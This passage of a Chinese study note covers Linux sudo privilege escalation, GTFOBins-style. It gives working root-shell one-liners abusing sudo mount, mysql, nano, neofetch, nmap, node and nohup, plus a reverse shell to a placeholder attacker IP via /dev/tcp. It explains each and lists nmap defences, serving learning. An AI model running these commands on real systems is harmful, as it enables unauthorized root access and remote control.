<li><strong><code>mount -o bind A B</code></strong>：是<code>mount</code>的 “绑定挂载” <strong>功能option</strong>，作用是将文件 &#x2F; 目录<code>A</code>的内容 “替换” 到文件 &#x2F; 目录<code>B</code>的位置（相当于给<code>A</code>创建一个 “硬链接式的挂载”，访问<code>B</code>就等于访问<code>A</code>）。</li>
<li><strong>这里的效果</strong>：将系统的<code>/bin/bash</code>（bash Shell 程序）绑定挂载到<code>/usr/bin/mount</code>（<code>mount</code>命令的实际路径）。此时，当执行<code>mount</code>命令时，系统实际运行的是<code>/bin/bash</code>，而不是真正的<code>mount</code>工具。</li>
</ul>
<h3 id="2-第二步命令：sudo-mount"><a href="#2-第二步命令：sudo-mount" class="headerlink" title="2. 第二步命令：sudo mount"></a>2. 第二步命令：<code>sudo mount</code></h3><ul>
<li><strong>因为当前用户（</strong><code>jackie</code>）被<code>sudoers</code>配置允许执行<code>sudo mount</code>（通常<code>mount</code>需要 root 权限），所以执行<code>sudo mount</code>时，会以 root 权限运行<code>/usr/bin/mount</code>。</li>
<li><strong>但由于第一步已经将</strong><code>/usr/bin/mount</code>绑定为<code>/bin/bash</code>，因此实际运行的是<strong>root 权限的<code>/bin/bash</code></strong>，直接获取了 root Shell（最终提示符变为<code>root@RedteamNotes:/home/jackie#</code>）。</li>
</ul>
<h3 id="核心原理：利用sudo权限的命令劫持"><a href="#核心原理：利用sudo权限的命令劫持" class="headerlink" title="核心原理：利用sudo权限的命令劫持"></a>核心原理：利用<code>sudo</code>权限的命令劫持</h3><p><strong>这个提权的前提是：</strong></p>
<ul>
<li><strong>当前用户被允许通过</strong><code>sudo</code>执行<code>mount</code>命令（无需密码或知道密码）；</li>
<li><strong>系统允许普通用户执行</strong><code>mount --bind</code>（或用户有<code>sudo mount</code>权限来执行绑定操作）。</li>
</ul>
<p><strong>通过 “替换高权限命令对应的文件”，让</strong><code>sudo</code>执行该命令时，实际运行的是 Shell，从而实现权限提升。</p>
<h2 id="sudo-mysql"><a href="#sudo-mysql" class="headerlink" title="sudo mysql"></a>sudo mysql</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203082807512.png?lastModify=1766751620" alt="image-20251203082807512"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203082949923.png?lastModify=1766751620" alt="image-20251203082949923"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7060" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> mysql <span class="cm-attribute">-e</span> <span class="cm-string">'\! /bin/bash'</span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-comment">#即可提权成功</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<h4 id="mysql-e"><a href="#mysql-e" class="headerlink" title="mysql -e"></a><code>mysql -e</code></h4><ul>
<li><code>mysql</code>：MySQL 客户端工具，用于连接 MySQL 服务器。</li>
<li><code>-e</code>（<code>--execute</code>）：指定要执行的 SQL 语句或 MySQL 客户端命令，执行后直接退出，无需进入交互式界面。</li>
</ul>
<h4 id="bin-bash"><a href="#bin-bash" class="headerlink" title="\! /bin/bash"></a><code>\! /bin/bash</code></h4><ul>
<li><code>\!</code> 是 MySQL 客户端的<strong>内置命令</strong>，作用是<strong>执行系统 Shell 命令</strong>（相当于在 MySQL 客户端中 “跳出” 到系统 Shell 执行命令）。</li>
<li><code>/bin/bash</code>：调用系统的 bash Shell，启动一个新的 Shell 会话。</li>
</ul>
<p><strong>这条命令的逻辑</strong>是：通过 <code>sudo</code> 获取高权限 → 启动 MySQL 客户端 → 利用 MySQL 客户端的 <code>\!</code> 命令执行系统 Shell → 最终得到一个与 <code>sudo mysql</code> 权限相同的 bash Shell（通常是 <code>root</code> 权限）。</p>
<p>**执行后会直接进入 **<code>root</code> 权限的 bash 环境（提示符变为 <code>root@xxx:/#</code>），实现提权。</p>
<p><strong>在 <code>mysql -e &#39;\! /bin/bash&#39;</code> 中对 <code>!</code> 加反斜杠 <code>\</code> 转义**，核心原因是**避免 Shell 对 <code>!</code> 的解析干扰，确保 <code>!</code> 能被 MySQL 客户端识别并执行</strong>，具体拆解如下：</p>
<h3 id="一、Shell-中的-：历史命令扩展符"><a href="#一、Shell-中的-：历史命令扩展符" class="headerlink" title="一、Shell 中的 !：历史命令扩展符"></a>一、Shell 中的 <code>!</code>：历史命令扩展符</h3><p><strong>在 Bash&#x2F;Zsh 等常见 Shell 中，</strong><code>!</code> 是<strong>历史命令扩展符号</strong>（称为 “bang”），作用是调用历史命令：</p>
<ul>
<li>**例如 **<code>!ls</code> 会执行最近一次以 <code>ls</code> 开头的历史命令，<code>!!</code> 会重复执行上一条命令。</li>
</ul>
<p>**如果直接输入 **<code>mysql -e &#39;! /bin/bash&#39;</code>（不加反斜杠），Shell 会先解析单引号外的内容（若为双引号或无引号则更明显），甚至可能误将 <code>!</code> 当作历史命令扩展，导致：</p>
<ol>
<li>**Shell 尝试替换 **<code>!</code> 为历史命令，引发语法错误或执行非预期的历史命令；</li>
<li><strong>即使单引号内的 <strong><code>!</code> 不会被 Shell 扩展（单引号会屏蔽大多数 Shell 解析），但为了</strong>兼容性和明确性</strong>，仍需转义 —— 避免某些 Shell（如 zsh）或特殊场景下（如命令嵌套）的解析异常。</li>
</ol>
<h3 id="二、MySQL-客户端中的-：系统命令执行符"><a href="#二、MySQL-客户端中的-：系统命令执行符" class="headerlink" title="二、MySQL 客户端中的 \!：系统命令执行符"></a>二、MySQL 客户端中的 <code>\!</code>：系统命令执行符</h3><p><strong>MySQL 客户端（</strong><code>mysql</code>）自身将 <code>\!</code> 定义为<strong>执行系统 Shell 命令的内置指令</strong>：</p>
<ul>
<li>**当 MySQL 客户端解析到 **<code>\!</code> 时，会 “跳出” MySQL 环境，调用系统 Shell 执行后续命令（如 <code>/bin/bash</code>）。</li>
<li>**这里的反斜杠 **<code>\</code> 是 MySQL 客户端的语法要求，用于标识 “这是 MySQL 的内置命令，而非 SQL 语句或普通字符”。</li>
</ul>
<h3 id="三、转义的本质：明确指令的归属者"><a href="#三、转义的本质：明确指令的归属者" class="headerlink" title="三、转义的本质：明确指令的归属者"></a>三、转义的本质：明确指令的归属者</h3><ul>
<li><strong>不加 <strong><code>\</code> 的 <code>!</code> 属于</strong>Shell 的语法</strong>（历史命令扩展）；</li>
<li><strong>加 <strong><code>\</code> 的 <code>\!</code> 属于</strong>MySQL 客户端的语法</strong>（系统命令执行）。</li>
</ul>
<p>**通过 **<code>\</code> 转义，相当于告诉 Shell：“这个 <code>!</code> 不是你的语法，无需处理，直接传递给 MySQL 客户端即可”，最终让 MySQL 正确识别并执行系统命令。</p>
<p><strong>大型应用如都有可能可以执行系统命令！</strong></p>
<h2 id="sudo-nano"><a href="#sudo-nano" class="headerlink" title="sudo nano"></a>sudo nano</h2><p><strong>vi，vim, ed ,less, more 都类似的原理</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203084034643.png?lastModify=1766751620" alt="image-20251203084034643"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203084147602.png?lastModify=1766751620" alt="image-20251203084147602"></p>
<p><strong>启动</strong><code>nano</code>，进入操作界面。**	**按<code>GTFOBins</code>的操作手册进行</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203084318684.png?lastModify=1766751620" alt="image-20251203084318684"></p>
<p>**下方是 **<code>CTRL+</code>执行不同命令</p>
<p><code>CTRL + R</code> read file读取文件，进入新界面</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203084457305.png?lastModify=1766751620" alt="image-20251203084457305"></p>
<p><strong>再次选下方的选项</strong></p>
<p><code>CTRL+X</code> execute command 执行命令。我们想执行的肯定是 <code>/bin/bash</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203084721812.png?lastModify=1766751620" alt="image-20251203084721812"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7123" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">reset;bash <span class="cm-number">1</span>>&0 <span class="cm-number">2</span>>&0</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203084828906.png?lastModify=1766751620" alt="image-20251203084828906"></p>
<p><strong>获得root shell</strong>		<strong>重合的话多按几个回车就可以了</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203084918869.png?lastModify=1766751620" alt="image-20251203084918869"></p>
<h4 id="reset"><a href="#reset" class="headerlink" title="reset"></a><code>reset</code></h4><ul>
<li><strong>作用</strong>：重置终端（Terminal）的状态，恢复终端的默认配置。这里是<strong>以防意外</strong></li>
</ul>
<h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a><code>bash</code></h4><ul>
<li><strong>启动一个新的 Bash Shell 进程，作为交互式命令解释器。</strong></li>
</ul>
<h4 id="1-0-和-2-0"><a href="#1-0-和-2-0" class="headerlink" title="1&gt;&amp;0 和 2&gt;&amp;0"></a><code>1&gt;&amp;0</code> 和 <code>2&gt;&amp;0</code></h4><ul>
<li><strong>IO 重定向核心</strong><ul>
<li><code>1</code> 是标准输出（<code>stdout</code>），<code>2</code> 是标准错误（<code>stderr</code>），<code>0</code> 是标准输入（<code>stdin</code>）。</li>
<li><code>&amp;0</code> 表示引用文件描述符 <code>0</code>（标准输入）对应的<strong>终端 &#x2F; 管道 &#x2F; 套接字</strong>。</li>
</ul>
</li>
<li><strong><code>1&gt;&amp;0</code></strong>：将标准输出重定向到标准输入对应的设备（通常是当前终端或网络套接字）。</li>
<li><strong><code>2&gt;&amp;0</code></strong>：将标准错误重定向到标准输入对应的设备。</li>
</ul>
<p><strong>本质</strong>：让 Bash 的输出（正常输出和错误）与输入使用同一个 “通道”（如终端、Socket），确保交互式 Shell 的输入输出在同一连接中交互。</p>
<h2 id="sudo-neofetch"><a href="#sudo-neofetch" class="headerlink" title="sudo neofetch"></a>sudo neofetch</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203092634384.png?lastModify=1766751620" alt="image-20251203092634384"></p>
<p><code>neofetch</code> 是一款 <strong>跨平台的命令行系统信息展示工具</strong>，核心作用是 <strong>以美观、个性化的方式输出当前系统的关键信息</strong></p>
<p><strong>可以通过自定义配置文件，从而改变输出的信息格式</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203092907084.png?lastModify=1766751620" alt="image-20251203092907084"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203093034250.png?lastModify=1766751620" alt="image-20251203093034250"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7160" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-def">rtn</span><span class="cm-operator">=</span><span class="cm-quote">$(mktemp)</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">echo</span><span class="cm-string">'exec /bin/bash'</span> > <span class="cm-def">$rtn</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> neofetch <span class="cm-attribute">--config</span> <span class="cm-def">$rtn</span></span></pre></div></div></div></div></div><div></div></div></div></pre>

<p><strong><code>rtn=$(mktemp)</code> 和 <code>mktemp rtn</code>的区别</strong></p>
<table>
<thead>
<tr>
<th><strong>特征</strong></th>
<th><code>rtn=$(mktemp)</code></th>
<th><code>mktemp rtn</code></th>
</tr>
</thead>
<tbody><tr>
<td><strong>操作类型</strong></td>
<td><strong>变量赋值 + 生成系统临时文件</strong></td>
<td><strong>指定模板生成临时文件（当前目录）</strong></td>
</tr>
<tr>
<td><strong>文件位置</strong></td>
<td><strong>默认</strong><code>/tmp</code>目录</td>
<td><strong>当前工作目录</strong></td>
</tr>
<tr>
<td><strong>文件名</strong></td>
<td><strong>系统自动生成唯一名称（如</strong><code>/tmp/tmp.XXX</code>）</td>
<td><strong>以</strong><code>rtn</code>为前缀，末尾加随机字符（如<code>rtnXXX</code>）</td>
</tr>
<tr>
<td><strong>变量<code>rtn</code></strong></td>
<td><strong>存储临时文件路径（后续可引用）</strong></td>
<td><strong>未定义（仅生成物理文件，无变量关联）</strong></td>
</tr>
<tr>
<td><strong>用途</strong></td>
<td><strong>脚本中安全创建临时文件并记录路径</strong></td>
<td><strong>自定义临时文件前缀（需手动处理路径）</strong></td>
</tr>
</tbody></table>
<h2 id="sudo-nice"><a href="#sudo-nice" class="headerlink" title="sudo nice"></a>sudo nice</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203093838621.png?lastModify=1766751620" alt="image-20251203093838621"></p>
<p><strong>在 Linux 系统中，</strong><code>nice</code> 是用于<strong>调整进程优先级</strong>的命令，核心作用是修改进程的 “nice 值”，从而影响 CPU 调度器对进程的资源分配策略 —— 优先级高的进程会获得更多 CPU 时间片，优先级低的进程则会 “谦让” 资源，避免占用过多系统资源影响其他关键进程。</p>
<h3 id="一、核心概念：nice-值与进程优先级"><a href="#一、核心概念：nice-值与进程优先级" class="headerlink" title="一、核心概念：nice 值与进程优先级"></a>一、核心概念：nice 值与进程优先级</h3><p>**Linux 中进程的优先级由 **<strong>nice 值</strong>（又称 “静态优先级”）决定，范围是 <strong>-20（最高优先级）到 19（最低优先级）</strong>：</p>
<ul>
<li><strong>默认 nice 值</strong>：新进程默认 nice 值为 <code>0</code>（普通优先级）。</li>
<li><strong>nice 值越低</strong>：进程优先级越高，CPU 调度器会优先分配资源。</li>
<li><strong>nice 值越高</strong>：进程优先级越低，会 “谦让” 给其他进程，适合后台任务（如备份、编译）。</li>
</ul>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203094622424.png?lastModify=1766751620" alt="image-20251203094622424"></p>
<h2 id="sudo-nmap"><a href="#sudo-nmap" class="headerlink" title="sudo nmap"></a>sudo nmap</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203094814997.png?lastModify=1766751620" alt="image-20251203094814997"></p>
<p><strong>利用<code>nmap</code>可以执行脚本文件提权</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203095031177.png?lastModify=1766751620" alt="image-20251203095031177"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7209" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-def">lml</span><span class="cm-operator">=</span><span class="cm-quote">$(mktemp)</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">echo</span> <span class="cm-string">'os.execute("/bin/bash")'</span> > <span class="cm-def">$lml</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> nmap <span class="cm-attribute">--script</span><span class="cm-operator">=</span><span class="cm-def">$lml</span></span></pre></div></div></div></div></div><div></div></div></div></pre>

<h4 id="echo-os-execute-bin-bash"><a href="#echo-os-execute-bin-bash" class="headerlink" title="echo &#39;os.execute(&quot;/bin/bash&quot;)&#39;"></a><code>echo &#39;os.execute(&quot;/bin/bash&quot;)&#39;</code></h4><ul>
<li><strong><code>echo</code></strong>：输出指定字符串（这里是 Lua 代码）。</li>
<li><strong><code>os.execute(&quot;/bin/bash&quot;)</code></strong>：这是 Lua 语言的内置函数调用 ——<code>os.execute()</code> 用于执行系统命令，参数 <code>&quot;/bin/bash&quot;</code> 表示启动一个 bash Shell 会话。</li>
</ul>
<p><strong>若执行后 Shell 无交互（立即退出），可修改 Lua 代码为：</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7217" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">echo</span> <span class="cm-string">'os.execute("/bin/bash -i >& /dev/tcp/攻击者IP/端口 0>&1")'</span> > <span class="cm-def">$lml</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<h3 id="核心原理：Nmap-NSE-脚本的执行特性"><a href="#核心原理：Nmap-NSE-脚本的执行特性" class="headerlink" title="核心原理：Nmap NSE 脚本的执行特性"></a>核心原理：Nmap NSE 脚本的执行特性</h3><p><strong>Nmap 的脚本引擎（NSE）支持 Lua 脚本扩展，</strong><code>--script</code>参数允许加载自定义 Lua 脚本。由于 Nmap 脚本具备执行系统命令的能力（通过 Lua 的<code>os.execute</code>、<code>io.popen</code>等函数），若用户被<code>sudoers</code>配置允许执行<code>sudo nmap</code>（无需密码或知道密码），即可通过构造恶意 Lua 脚本实现权限提升。</p>
<h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ol>
<li><strong>严格限制<code>sudo</code>权限</strong>：避免将<code>nmap</code>等支持脚本 &#x2F; 命令执行的工具加入用户的<code>sudo</code>权限列表；若必须授权，可通过<code>sudoers</code>的<code>NOEXEC</code>标记限制（如<code>user ALL=(ALL) NOEXEC: /usr/bin/nmap</code>），阻止脚本执行系统命令。</li>
<li><strong>审计 Nmap 脚本</strong>：禁止加载自定义脚本，或限制<code>--script</code>参数仅能使用官方脚本（如<code>--script=safe</code>）。</li>
<li><strong>监控异常 Nmap 执行</strong>：警惕<code>sudo nmap</code>加载临时文件或非官方脚本的行为，此类操作通常是攻击迹象。</li>
</ol>
<p><strong>nmap的不同版本会有不同的提权方式</strong></p>
<h2 id="sudo-node"><a href="#sudo-node" class="headerlink" title="sudo node"></a>sudo node</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203105315371.png?lastModify=1766751620" alt="image-20251203105315371"></p>
<p>**Linux 中的 **<code>node</code> 命令主要指 <strong>Node.js 运行时的执行入口</strong>，用于在终端中运行 JavaScript 代码、执行 Node.js 脚本或启动交互式环境（REPL），是使用 Node.js 开发和运行应用的核心工具。</p>
<h3 id="node-命令的核心作用"><a href="#node-命令的核心作用" class="headerlink" title="node 命令的核心作用"></a><code>node</code> 命令的核心作用</h3><ol>
<li><strong>运行 JavaScript 脚本</strong>：执行 <code>.js</code> 后缀的 Node.js 脚本文件；</li>
<li><strong>启动交互式环境（REPL）</strong>：直接输入 <code>node</code> 进入逐行执行代码的交互模式；</li>
<li><strong>执行单行 JavaScript 代码</strong>：通过参数直接运行简短的 JS 代码；</li>
<li><strong>调试 Node.js 程序</strong>：搭配调试参数启动调试模式。</li>
</ol>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203105620251.png?lastModify=1766751620" alt="image-20251203105620251"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7249" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> <span class="cm-builtin">node</span> <span class="cm-attribute">-e</span> <span class="cm-string">"require('child_process').spawn('/bin/bash',{stdio:[0,1,2]})"</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<h3 id="一、命令各部分解析"><a href="#一、命令各部分解析" class="headerlink" title="一、命令各部分解析"></a>一、命令各部分解析</h3><h4 id="1-sudo-1"><a href="#1-sudo-1" class="headerlink" title="1. sudo"></a>1. <code>sudo</code></h4><p>**以超级用户（或配置的高权限用户）身份执行后续的 **<code>node</code> 命令，继承 <code>sudo</code> 赋予的权限（通常为 <code>root</code> 权限）。</p>
<h4 id="2-node-e"><a href="#2-node-e" class="headerlink" title="2. node -e &quot;...&quot;"></a>2. <code>node -e &quot;...&quot;</code></h4><ul>
<li><code>node</code>：Node.js 运行时的执行入口；</li>
<li><code>-e</code>（<code>--eval</code>）：直接执行引号内的 JavaScript 代码，无需写入文件。</li>
</ul>
<h4 id="3-require-child-process-spawn-bin-bash-stdio-0-1-2"><a href="#3-require-child-process-spawn-bin-bash-stdio-0-1-2" class="headerlink" title="3. require(&#39;child_process&#39;).spawn(&#39;/bin/bash&#39;, {stdio:[0,1,2]})"></a>3. <code>require(&#39;child_process&#39;).spawn(&#39;/bin/bash&#39;, {stdio:[0,1,2]})</code></h4><ul>
<li><code>require(&#39;child_process&#39;)</code>：加载 Node.js 的内置模块 <code>child_process</code>（用于创建子进程执行系统命令）；</li>
<li><code>spawn(&#39;/bin/bash&#39;, ...)</code>：<code>spawn</code> 是 <code>child_process</code> 模块中创建子进程的方法，这里指定要执行的命令为 <code>/bin/bash</code>（启动 bash Shell）；</li>
<li><code>{stdio:[0,1,2]}</code>：配置子进程的标准输入 &#x2F; 输出 &#x2F; 错误流（<code>stdio</code>）：<ul>
<li><code>0</code> 是标准输入（<code>stdin</code>），<code>1</code> 是标准输出（<code>stdout</code>），<code>2</code> 是标准错误（<code>stderr</code>）；</li>
<li><code>stdio:[0,1,2]</code> 表示子进程的输入 &#x2F; 输出 &#x2F; 错误与当前 Node.js 进程的对应流<strong>直接关联</strong>，确保 Shell 具备交互性（能输入命令、输出结果）。</li>
</ul>
</li>
</ul>
<h3 id="二、核心原理与效果"><a href="#二、核心原理与效果" class="headerlink" title="二、核心原理与效果"></a>二、核心原理与效果</h3><h4 id="1-为什么用-spawn-而非-exec？"><a href="#1-为什么用-spawn-而非-exec？" class="headerlink" title="1. 为什么用 spawn 而非 exec？"></a>1. 为什么用 <code>spawn</code> 而非 <code>exec</code>？</h4><ul>
<li><code>exec</code> 适合执行短命令并获取输出，但默认不支持交互式 Shell；</li>
<li><code>spawn</code> 是 “流式” 创建子进程，通过 <code>stdio</code> 配置可直接继承父进程的 IO 流，从而实现<strong>交互式 bash Shell</strong>（能输入命令、执行操作、看到输出）。</li>
</ul>
<h4 id="2-执行效果"><a href="#2-执行效果" class="headerlink" title="2. 执行效果"></a>2. 执行效果</h4><p>**命令运行后，会直接生成一个与 **<code>sudo node</code> 权限相同的 bash Shell（通常是 <code>root</code> 权限），提示符变为 <code>root@xxx:/#</code>，支持所有 bash 交互操作（如执行命令、修改文件、管理进程等）。</p>
<h2 id="sudo-nohup"><a href="#sudo-nohup" class="headerlink" title="sudo nohup"></a>sudo nohup</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203110324741.png?lastModify=1766751620" alt="image-20251203110324741"></p>
<p><strong>在 Linux&#x2F;Unix 系统中，</strong><code>nohup</code>（全称 “no hang up”，意为 “不挂断”）是一个命令工具，核心作用是<strong>让指定的进程在用户退出登录（挂断终端）后继续后台运行</strong>，并将进程的输出重定向到指定文件（默认 <code>nohup.out</code>），避免进程因终端关闭而终止。</p>
<h3 id="核心作用与解决的问题"><a href="#核心作用与解决的问题" class="headerlink" title="核心作用与解决的问题"></a>核心作用与解决的问题</h3><p><strong>默认情况下，通过终端启动的进程会依赖终端会话（属于终端的子进程）：</strong></p>
<ul>
<li><strong>若用户退出登录、关闭终端或网络断开，终端会向子进程发送</strong><code>SIGHUP</code>（挂断信号），导致进程终止。<code>nohup</code>的作用就是屏蔽 <code>SIGHUP</code> 信号，让进程脱离终端的控制，即使终端关闭，进程仍能在后台持续运行。</li>
</ul>
<p><strong>经常用于文件管理</strong></p>
<table>
<thead>
<tr>
<th><strong>需求场景</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>启动长期运行的 Web 服务</strong></td>
<td><code>nohup java -jar app.jar &gt; app.log 2&gt;&amp;1 &amp;</code></td>
</tr>
<tr>
<td><strong>执行耗时的数据处理脚本</strong></td>
<td><code>nohup python data_process.py &gt; process.log 2&gt;&amp;1 &amp;</code></td>
</tr>
<tr>
<td><strong>后台备份数据库</strong></td>
<td><code>nohup mysqldump -u root -p dbname &gt; backup.sql 2&gt;&amp;1 &amp;</code></td>
</tr>
</tbody></table>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203110856056.png?lastModify=1766751620" alt="image-20251203110856056"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7307" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> nohup /bin/bash <span class="cm-attribute">-c</span> <span class="cm-string">"bash <</span><span class="cm-quote">$(tty)</span><span class="cm-string"> ></span><span class="cm-quote">$(tty)</span><span class="cm-string"> 2></span><span class="cm-quote">$(tty)</span><span class="cm-string">"</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

